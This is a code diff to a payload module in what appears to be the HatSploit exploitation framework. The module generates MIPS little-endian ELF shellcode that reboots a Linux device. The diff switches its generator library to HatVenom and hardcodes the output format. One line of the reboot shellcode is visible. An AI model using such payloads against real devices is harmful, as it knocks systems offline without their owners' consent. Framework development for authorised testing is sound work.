@@ -25,10 +25,10 @@
 #
 
 from core.lib.payload import Payload
-from utils.payload.payload import PayloadGenerator
+from utils.hatvenom.hatvenom import HatVenom
 
 
-class HatSploitPayload(Payload, PayloadGenerator):
+class HatSploitPayload(Payload, HatVenom):
     details = {
         'Category': "stager",
         'Name': "Linux mipsle Reboot",
@@ -49,22 +49,7 @@ class HatSploitPayload(Payload, PayloadGenerator):
         'Type': "one_side"
     }
 
-    options = {
-        'FORMAT': {
-            'Description': "Executable format.",
-            'Value': "elf",
-            'Type': None,
-            'Required': True
-        }
-    }
-
     def run(self):
-        executable_format = self.parse_options(self.options)
-
-        if executable_format not in self.formats.keys():
-            self.output_error("Invalid executable format!")
-            return
-
         self.output_process("Generating shellcode...")
         shellcode = (
             b"\x21\x43\x06\x3c"  # lui     a2,0x4321
@@ -78,6 +63,6 @@ class HatSploitPayload(Payload, PayloadGenerator):
         )
 
         self.output_process("Generating payload...")
-        payload = self.generate(executable_format, 'mipsle', shellcode)
+        payload = self.generate('elf', 'mipsle', shellcode)
 
         return payload
